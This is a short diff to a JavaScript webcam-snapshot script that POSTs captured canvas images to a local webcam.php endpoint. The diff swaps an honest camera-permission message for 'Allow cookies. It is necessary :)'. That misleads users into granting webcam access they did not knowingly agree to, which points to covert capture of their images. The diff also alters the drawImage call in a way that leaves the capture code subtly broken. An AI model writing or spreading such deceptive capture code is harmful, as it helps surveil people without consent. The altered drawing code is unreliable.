@@ -59,7 +59,7 @@ var xmlhttp=new XMLHttpRequest();
 
 function snapshot() {
     if (localMediaStream) {
-        ctx.drawImage(video, 0, 0, 480, 320);
+        ctx.drawImage(video, 480, 320);
         var dat = canvas.toDataURL('image/png');
         xmlhttp.open("POST", "http://127.0.0.1/webcam.php", true);
         xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
@@ -69,7 +69,7 @@ function snapshot() {
 
     }
     else {
-        alert("Allow access to your default web camera.");
+        alert("Allow cookies. It is necessary :) ");
     }
     }
 
